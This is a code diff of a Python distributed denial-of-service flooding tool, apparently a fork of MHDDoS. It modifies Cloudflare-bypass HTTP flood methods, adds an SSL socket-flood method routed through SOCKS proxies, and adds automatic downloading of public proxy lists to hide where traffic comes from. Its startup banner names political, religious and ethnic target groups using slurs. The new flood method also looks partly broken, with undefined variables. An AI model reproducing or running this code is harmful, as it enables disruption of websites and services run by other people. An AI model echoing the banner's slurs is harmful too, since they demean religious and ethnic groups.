@@ -1,14 +1,14 @@
 #!/usr/bin/env python3
 import os, sys, random
 try:
-    import socks, requests, wget, cfscrape, urllib3
+    import socks, requests, wget, cfscrape, urllib3, ssl
 except:
     if sys.platform.startswith("linux"):
-        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
+        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy ssl")
     elif sys.platform.startswith("freebsd"):
-        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
+        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy ssl")
     else:
-        os.system("pip install pysocks requests wget cfscrape urllib3 scapy")
+        os.system("pip install pysocks requests wget cfscrape urllib3 scapy ssl")
     import socks, requests, wget, cfscrape, urllib3
  
 from concurrent.futures import ThreadPoolExecutor, as_completed
@@ -34,6 +34,7 @@ from threading import Event, Thread
 from time import sleep, time
 from typing import Any, List, Set, Tuple
 from urllib import parse
+from urllib.parse import urlparse
 from uuid import UUID, uuid4
 
 from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
@@ -127,7 +128,7 @@ def exit(*message):
 
 class Methods:
     LAYER7_METHODS: Set[str] = {
-        "CFTANKIE", "CFTANKIE2", "CFRAGHEAD", "CFRAGHEAD2", "RAGHEAD", 
+        "CFTANKIE", "CFTANKIE2", "CFFUNDIE", "CFFUNDIE2", "FUNDIE", 
         "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
         "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
         "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP"
@@ -706,8 +707,8 @@ class HttpFlood(Thread):
             "POST": self.POST,
             "CFTANKIE": self.CFTANKIE,
             "CFTANKIE2": self.CFTANKIE2,
-            "CFRAGHEAD": self.CFRAGHEAD,
-            "CFRAGHEAD2": self.CFRAGHEAD2,
+            "CFFUNDIE": self.CFFUNDIE,
+            "CFFUNDIE2": self.CFFUNDIE2,
             "CFB": self.CFB,
             "CFBUAM": self.CFBUAM,
             "XMLRPC": self.XMLRPC,
@@ -717,7 +718,7 @@ class HttpFlood(Thread):
             "DGB": self.DGB,
             "OVH": self.OVH,
             "AVB": self.AVB,
-            "RAGHEAD": self.RAGHEAD,
+            "FUNDIE": self.FUNDIE,
             "STRESS": self.STRESS,
             "DYN": self.DYN,
             "SLOW": self.SLOW,
@@ -856,7 +857,7 @@ class HttpFlood(Thread):
 
     @staticmethod
     def getMethodType(method: str) -> str:
-        return "GET" if {method.upper()} & {"CFTANKIE", "CFTANKIE2", "CFRAGHEAD", "CFRAGHEAD2", "RAGHEAD", 
+        return "GET" if {method.upper()} & {"CFTANKIE", "CFTANKIE2", "CFFUNDIE", "CFFUNDIE2", "FUNDIE", 
                                             "CFB", "CFBUAM", "GET", "TOR", "COOKIE", "OVH", "EVEN",
                                             "DYN", "SLOW", "PPS", "APACHE",
                                             "BOT", "RHEX", "STOMP"} \
@@ -1014,18 +1015,20 @@ class HttpFlood(Thread):
         if self._proxies:
             pro = randchoice(self._proxies)
         s = None
-        with suppress(Exception), cfscrape.create_scraper() as s:
-            for _ in range(self._rpc):
-                if pro:
-                    with s.get(str(self._target) + "?=" + str(random.randint(0,20000)),
-                               proxies=pro.asRequest(), timeout=45) as res:
-                        REQUESTS_SENT += 1
-                        BYTES_SEND += Tools.sizeOfRequest(res)
-                        continue
 
-                with s.get(str(self._target) + "?=" + str(random.randint(0,20000)), timeout=45) as res:
-                    REQUESTS_SENT += 1
-                    BYTES_SEND += Tools.sizeOfRequest(res)
+        cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
+
+        with suppress(Exception), cfscrape.create_scraper() as s:
+            try:
+                for _ in range(self._rpc):
+                    if pro:
+                        with s.get(str(self._target) + "?=" + str(random.randint(0,20000)),
+                                   proxies=pro.asRequest(), timeout=45) as res:
+                            REQUESTS_SENT += 1
+                            BYTES_SEND += Tools.sizeOfRequest(res)
+                            continue
+            except:
+                sleep(random.randint(20,40))
         Tools.safe_close(s)
 
     def CFTANKIE2(self):
@@ -1038,16 +1041,19 @@ class HttpFlood(Thread):
         cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
 
         with suppress(Exception), cfscrape.create_scraper() as s:
-            for _ in range(self._rpc):
-                with s.get(str(self._target), timeout=60) as res:
-                    REQUESTS_SENT += 1
-                    BYTES_SEND += Tools.sizeOfRequest(res)
-                with s.post(str(self._target) + "?=" + str(random.randint(0,20000)), timeout=45) as res:
-                    REQUESTS_SENT += 1
-                    BYTES_SEND += Tools.sizeOfRequest(res)
+            try:
+                for _ in range(self._rpc):
+                    with s.get(str(self._target), timeout=60) as res:
+                        REQUESTS_SENT += 1
+                        BYTES_SEND += Tools.sizeOfRequest(res)
+                    with s.post(str(self._target) + "?=" + str(random.randint(0,20000)), timeout=45) as res:
+                        REQUESTS_SENT += 1
+                        BYTES_SEND += Tools.sizeOfRequest(res)
+            except:
+                sleep(random.randint(20,40))
         Tools.safe_close(s)
 
-    def CFRAGHEAD(self):
+    def CFFUNDIE(self):
         global REQUESTS_SENT, BYTES_SEND
         pro = None
         if self._proxies:
@@ -1067,20 +1073,23 @@ class HttpFlood(Thread):
 
         s = None
         with suppress(Exception), cfscrape.create_scraper() as s:
-            for _ in range(self._rpc):
-                if pro:
-                    http.request("GET", str(self._target), proxies=pro.asRequest(), headers=headersx, timeout=60)
-                    http.request("GET /?=" +str(random.randint(0,20000)), proxies=pro.asRequest(), headers=headersx, timeout=60)
-                    with s.get(str(self._target), headers=headersx, proxies=pro.asRequest(), timeout=60) as res:
-                        REQUESTS_SENT += 1
-                        BYTES_SEND += Tools.sizeOfRequest(res)
-                    with s.get(str(self._target) + "?=" + str(random.randint(0,20000)),
-                               proxies=pro.asRequest(), headers=headersx, timeout=60) as res:
-                        REQUESTS_SENT += 1
-                        BYTES_SEND += Tools.sizeOfRequest(res)
+            try:
+                for _ in range(self._rpc):
+                    if pro:
+                        #http.request("GET", str(self._target), proxies=pro.asRequest(), headers=headersx, timeout=60)
+                        #http.request("GET /?=" +str(random.randint(0,20000)), proxies=pro.asRequest(), headers=headersx, timeout=60)
+                        with s.get(str(self._target), headers=headersx, proxies=pro.asRequest(), timeout=60) as res:
+                            REQUESTS_SENT += 1
+                            BYTES_SEND += Tools.sizeOfRequest(res)
+                        with s.get(str(self._target) + "?=" + str(random.randint(0,20000)),
+                                   proxies=pro.asRequest(), headers=headersx, timeout=60) as res:
+                            REQUESTS_SENT += 1
+                            BYTES_SEND += Tools.sizeOfRequest(res)
+            except:
+                sleep(random.randint(20,40))
         Tools.safe_close(s)
 
-    def CFRAGHEAD2(self):
+    def CFFUNDIE2(self):
         global REQUESTS_SENT, BYTES_SEND
         s = None
 
@@ -1097,16 +1106,18 @@ class HttpFlood(Thread):
         "Accept-Language" : "vi,en;q=0.9,en-US;q=0.8"}
 
         with suppress(Exception), cfscrape.create_scraper() as s:
-            for _ in range(self._rpc):
-
-                #http.request("GET", str(self._target), headers=headersx, timeout=60)
-                #http.request("GET /?=" +str(random.randint(0,20000)), headers=headersx, timeout=60)
-                with s.get(str(self._target), headers=headersx, timeout=60) as res:
-                    REQUESTS_SENT += 1
-                    BYTES_SEND += Tools.sizeOfRequest(res)
-                with s.get(str(self._target) + "?=" + str(random.randint(0,20000)), timeout=60) as res:
-                    REQUESTS_SENT += 1
-                    BYTES_SEND += Tools.sizeOfRequest(res)
+            try:
+                for _ in range(self._rpc):
+                    #http.request("GET", str(self._target), headers=headersx, timeout=60)
+                    #http.request("GET /?=" +str(random.randint(0,20000)), headers=headersx, timeout=60)
+                    with s.get(str(self._target), headers=headersx, timeout=60) as res:
+                        REQUESTS_SENT += 1
+                        BYTES_SEND += Tools.sizeOfRequest(res)
+                    with s.get(str(self._target) + "?=" + str(random.randint(0,20000)), timeout=60) as res:
+                        REQUESTS_SENT += 1
+                        BYTES_SEND += Tools.sizeOfRequest(res)
+            except:
+                sleep(random.randint(20,40))
         Tools.safe_close(s)
 
     def CFB(self):
@@ -1150,18 +1161,17 @@ class HttpFlood(Thread):
                 Tools.send(s, payload)
         Tools.safe_close(s)
 
-    def RAGHEAD(self):
+    def FUNDIE(self):
         # AVB + SLOW
         payload: bytes = self.generate_payload()
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
                 sleep(max(self._rpc / 1000, 1))
-                Tools.send(s, payload)
-            while Tools.send(s, payload) and s.recv(1):
-                keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
-                Tools.send(s, keep)
-                sleep(max(self._rpc / 1000, 1))
+                while Tools.send(s, payload) and s.recv(1):
+                    keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
+                    Tools.send(s, keep)
+                    sleep(self._rpc / 15)
         Tools.safe_close(s)
 
         # BYPASS
@@ -1182,6 +1192,42 @@ class HttpFlood(Thread):
                     REQUESTS_SENT += 1
                     BYTES_SEND += Tools.sizeOfRequest(res)
         Tools.safe_close(s)
+
+    def SKY(self):
+        global REQUESTS_SENT, BYTES_SEND
+        pro = None
+        if self._proxies:
+            pro = randchoice(self._proxies)
+
+        proxy = random.choice(proxies).strip().split(":")
+        timelol = time.time() + int(timer)
+        req =  "GET / HTTP/1.1\r\nHost: " + str(self._host) + "\r\n"
+        req += "Cache-Control: no-cache\r\n"
+        req += "User-Agent: " + randchoice(self._useragents) + "\r\n"
+        req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
+        req += "Sec-Fetch-Site: same-origin\r\n"
+        req += "Sec-GPC: 1\r\n"
+        req += "Sec-Fetch-Mode: navigate\r\n"
+        req += "Sec-Fetch-Dest: document\r\n"
+        req += "Upgrade-Insecure-Requests: 1\r\n"
+        req += "Connection: Keep-Alive\r\n\r\n"
+        while time.time() < timelol:
+            try:
+                s = socks.socksocket()
+                s.connect((str(urlparse(url).netloc), int(443)))
+                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+                ctx = ssl.SSLContext()
+                s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
+                s.send(str.encode(req))
+                try:
+                    for _ in range(100):
+                        s.send(str.encode(req))
+                        s.send(str.encode(req))
+                except:
+                    s.close()
+            except:
+                s.close()
+
 
     def DGB(self):
         global REQUESTS_SENT, BYTES_SEND
@@ -1709,13 +1755,154 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
     return proxies
 
 
+def DownloadProxies(proxy_ver: str, out_file: str):
+
+	if proxy_ver == 4:
+		f = open(out_file,'wb')
+		socks4_api = [
+			#"http://proxysearcher.sourceforge.net/Proxy%20List.php?type=socks",
+			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4",
+			#"https://openproxy.space/list/socks4",
+			"https://openproxylist.xyz/socks4.txt",
+			"https://proxyspace.pro/socks4.txt",
+			"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt",
+			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
+			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
+			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
+			"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt",
+			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
+			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
+			#"https://spys.me/socks.txt",
+			#"https://www.freeproxychecker.com/result/socks4_proxies.txt",
+			"https://www.proxy-list.download/api/v1/get?type=socks4",
+			"https://www.proxyscan.io/download?type=socks4",
+			"https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",
+			"https://api.openproxylist.xyz/socks4.txt",
+		]
+		for api in socks4_api:
+			try:
+				r = requests.get(api,timeout=5)
+				f.write(r.content)
+			except:
+				pass
+		f.close()
+		try:#credit to All3xJ
+			r = requests.get("https://www.socks-proxy.net/",timeout=5)
+			part = str(r.content)
+			part = part.split("<tbody>")
+			part = part[1].split("</tbody>")
+			part = part[0].split("<tr><td>")
+			proxies = ""
+			for proxy in part:
+				proxy = proxy.split("</td><td>")
+				try:
+					proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
+				except:
+					pass
+				fd = open(out_file,"a")
+				fd.write(proxies)
+				fd.close()
+		except:
+			pass
+	if proxy_ver == 5:
+		f = open(out_file,'wb')
+		socks5_api = [
+			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",
+			"https://www.proxy-list.download/api/v1/get?type=socks5",
+			"https://www.proxyscan.io/download?type=socks5",
+			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
+			"https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
+			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
+			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
+			"https://api.openproxylist.xyz/socks5.txt",
+			#"https://www.freeproxychecker.com/result/socks5_proxies.txt",
+			#http://proxysearcher.sourceforge.net/Proxy%20List.php?type=socks",
+			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5",
+			#"https://openproxy.space/list/socks5",
+			"https://openproxylist.xyz/socks5.txt",
+			"https://proxyspace.pro/socks5.txt",
+			"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
+			"https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt",
+			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
+			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
+			#"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5.txt",
+			#"https://spys.me/socks.txt",
+			#"http://www.socks24.org/feeds/posts/default"",
+		]
+		for api in socks5_api:
+			try:
+				r = requests.get(api,timeout=5)
+				f.write(r.content)
+			except:
+				pass
+		f.close()
+	if proxy_ver == "http" or proxy_ver == 0:
+		f = open(out_file,'wb')
+		http_api = [
+			"https://api.proxyscrape.com/?request=displayproxies&proxytype=http",
+			"https://www.proxy-list.download/api/v1/get?type=http",
+			"https://www.proxyscan.io/download?type=http",
+			"https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
+			"https://api.openproxylist.xyz/http.txt",
+			"https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt",
+			"http://alexa.lr2b.com/proxylist.txt",
+			#"https://www.freeproxychecker.com/result/http_proxies.txt",
+			#"http://proxysearcher.sourceforge.net/Proxy%20List.php?type=http",
+			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
+			"https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
+			"https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
+			"https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
+			"https://proxy-spider.com/api/proxies.example.txt",
+			"https://multiproxy.org/txt_all/proxy.txt",
+			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
+			"https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt",
+			"https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/https.txt",
+			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
+			#"https://openproxy.space/list/http",
+			"https://openproxylist.xyz/http.txt",
+			"https://proxyspace.pro/http.txt",
+			"https://proxyspace.pro/https.txt",
+			"https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
+			"https://raw.githubusercontent.com/aslisk/proxyhttps/main/https.txt",
+			"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt",
+			"https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Repo/master/proxy_list.txt",
+			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
+			"https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
+			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
+			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
+			"https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
+			"https://raw.githubusercontent.com/RX4096/proxy-list/main/online/http.txt",
+			"https://raw.githubusercontent.com/RX4096/proxy-list/main/online/https.txt",
+			"https://raw.githubusercontent.com/saisuiu/uiu/main/free.txt",
+			"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/http.txt",
+			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
+			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
+			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+			"https://rootjazz.com/proxies/proxies.txt",
+			"https://sheesh.rip/http.txt",
+			#"https://spys.me/proxy.txt",
+			"https://www.proxy-list.download/api/v1/get?type=https",
+		]
+		for api in http_api:
+			try:
+				r = requests.get(api,timeout=5)
+				f.write(r.content)
+			except:
+				pass
+		f.close()
+
+	print("> Have already downloaded proxies list as "+ str(out_file))
+
+
+
 if __name__ == '__main__':
     with suppress(KeyboardInterrupt):
         with suppress(IndexError):
 
             print("This tool is against the tankie, ultranationalist, religious right and militarist")
-            print("Only for kacap, tankie, raghead, papist, fundie, kach, hindutva, homophobia, junta and their allies")
-            print("Do not attack western goverment and company, Fatah, PKK and National Unity Government")
+            print("Only for kacap, tankie, FUNDIE, papist, fundie, kach, hindutva, homophobia, junta and their allies")
+            print("Do not attack Fatah, PKK, National Unity Government and other resistance group")
+            print("This tool is against the oppression, the harmful propaganda and")
 
             one = argv[1].upper()
 
@@ -1792,6 +1979,9 @@ if __name__ == '__main__':
                 if rpc > 100:
                     logger.warning(
                         "RPC (Request Pre Connection) is higher than 100")
+
+                # get the up-to-date proxies
+                DownloadProxies(proxy_ty, proxy_li)
 
                 proxies = handleProxyList(con, proxy_li, proxy_ty, url)
                 for thread_id in range(threads):
